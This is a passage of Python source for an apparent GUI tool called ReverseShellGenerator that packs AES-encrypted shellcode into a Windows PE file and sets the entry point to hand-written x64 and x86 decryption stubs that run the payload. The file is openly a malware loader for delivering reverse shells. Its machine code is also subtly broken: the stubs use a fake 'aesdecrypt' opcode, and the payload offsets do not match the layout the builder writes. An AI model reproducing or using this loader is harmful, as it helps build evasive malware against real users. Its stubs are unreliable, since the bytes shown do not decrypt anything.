        text_section.PointerToRawData = 0x200
        text_section.VirtualAddress = 0x1000
        text_section.Misc_VirtualSize = len(text_section_data)
        text_section.SizeOfRawData = (len(text_section_data) // 0x200 + 1) * 0x200
        
        # Prepare payload data (key + nonce + encrypted shellcode)
        payload_data = self.key + self.nonce + self.encrypted_shellcode
        payload_size = len(payload_data)
        
        # Write payload to .data section
        data_section.PointerToRawData = text_section.PointerToRawData + text_section.SizeOfRawData
        data_section.VirtualAddress = text_section.VirtualAddress + text_section.Misc_VirtualSize
        data_section.Misc_VirtualSize = payload_size
        data_section.SizeOfRawData = (payload_size // 0x200 + 1) * 0x200
        
        # Set entry point to decryption stub
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = text_section.VirtualAddress
        
        # Set architecture
        if self.arch_combo.currentText() == "x64":
            pe.FILE_HEADER.Machine = pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_AMD64']
            pe.OPTIONAL_HEADER.Magic = pefile.OPTIONAL_HEADER_MAGIC_PE_PLUS
        else:
            pe.FILE_HEADER.Machine = pefile.MACHINE_TYPE['IMAGE_FILE_MACHINE_I386']
            pe.OPTIONAL_HEADER.Magic = pefile.OPTIONAL_HEADER_MAGIC_PE
            
        # Configure headers
        pe.OPTIONAL_HEADER.SectionAlignment = 0x1000
        pe.OPTIONAL_HEADER.FileAlignment = 0x200
        pe.OPTIONAL_HEADER.SizeOfImage = 0x3000
        pe.OPTIONAL_HEADER.SizeOfHeaders = 0x200
        pe.OPTIONAL_HEADER.Subsystem = pefile.SUBSYSTEM_TYPE['IMAGE_SUBSYSTEM_WINDOWS_CUI']
        
        # Rebuild PE structure
        pe.sections = [text_section, data_section]
        pe.__structures__ = []
        pe.write(filename)
        
        # Directly patch in the section data
        with open(filename, 'r+b') as f:
            # Write .text section
            f.seek(text_section.PointerToRawData)
            f.write(text_section_data)
            f.write(b'\x00' * (text_section.SizeOfRawData - len(text_section_data)))
            
            # Write .data section
            f.seek(data_section.PointerToRawData)
            f.write(payload_data)
            f.write(b'\x00' * (data_section.SizeOfRawData - payload_size))
    
    def create_section(self, pe, name, characteristics):
        """Create PE section with specified characteristics"""
        section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
        section.__unpack__(bytearray(section.sizeof()))
        section.Name = name.encode()
        section.Misc = 0
        section.VirtualAddress = 0
        section.SizeOfRawData = 0
        section.PointerToRawData = 0
        section.PointerToRelocations = 0
        section.PointerToLinenumbers = 0
        section.NumberOfRelocations = 0
        section.NumberOfLinenumbers = 0
        section.Characteristics = characteristics
        return section
    
    def generate_decryption_stub(self):
        """Generate assembly decryption stub for target architecture"""
        if self.arch_combo.currentText() == "x64":
            return self.x64_decryption_stub()
        else:
            return self.x86_decryption_stub()
    
    def x64_decryption_stub(self):
        """x64 assembly decryption stub"""
        # Position-independent code
        stub = (
            # Prolog
            b"\x48\x83\xEC\x28"              # sub rsp, 40
            
            # Load parameters
            b"\x48\x8D\x15\xF1\x0F\x00\x00"  # lea rdx, [rel payload_data] ; payload location
            b"\x48\x89\xD0"                  # mov rax, rdx
            b"\x48\x05\x20\x00\x00\x00"      # add rax, 32   ; key starts after 32-byte nonce
            b"\x48\x89\xC1"                  # mov rcx, rax  ; key in rcx
            b"\x48\x83\xC0\x20"              # add rax, 32   ; ciphertext starts after key
            b"\x48\x89\xC6"                  # mov rsi, rax  ; ciphertext in rsi
            
            # Initialize AES
            b"\x48\x8D\x3D\xD1\x0F\x00\x00"  # lea rdi, [rel aes_ctx]
            b"\x48\x89\xCF"                  # mov rdi, rcx  ; key in rdi
            b"\x48\x89\xD1"                  # mov rcx, rdx  ; nonce in rcx
            
            # Decrypt (pseudo-instructions - would be replaced with actual AES-NI)
            b"\x0F\xAE\x38"                  # aesdecrypt
            b"\x48\x89\xF0"                  # mov rax, rsi  ; decrypted shellcode
            
            # Transfer control
            b"\xFF\xD0"                      # call rax
            
            # Epilog
            b"\x48\x83\xC4\x28"              # add rsp, 40
            b"\xC3"                          # ret
            
            # Data area
            b"\x90" * 16                     # Placeholder for context
        )
        return stub.ljust(512, b"\x90")
    
    def x86_decryption_stub(self):
        """x86 assembly decryption stub"""
        stub = (
            # Prolog
            b"\x60"                          # pusha
            
            # Load parameters
            b"\xE8\x00\x00\x00\x00"          # call $+5
            b"\x5E"                          # pop esi
            b"\x81\xC6\x1B\x00\x00\x00"      # add esi, 0x1B ; payload_data position
            
            # Set up AES
            b"\x8B\xFE"                      # mov edi, esi  ; nonce
            b"\x83\xC6\x20"                  # add esi, 32   ; key position
            b"\x8B\xCE"                      # mov ecx, esi  ; key
            b"\x83\xC6\x20"                  # add esi, 32   ; ciphertext
            
            # Decrypt
            b"\x51"                          # push ecx
            b"\x52"                          # push edx
            b"\x50"                          # push eax
            b"\x0F\xAE\x38"                  # aesdecrypt
            b"\x83\xC4\x0C"                  # add esp, 12
            
            # Transfer control
            b"\xFF\xD6"                      # call esi
            
            # Epilog
            b"\x61"                          # popa
            b"\xC3"                          # ret
        )
        return stub.ljust(256, b"\x90")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setWindowIcon(QIcon("thorn_apple.ico"))
    window = ReverseShellGenerator()
    window.show()
    sys.exit(app.exec_())
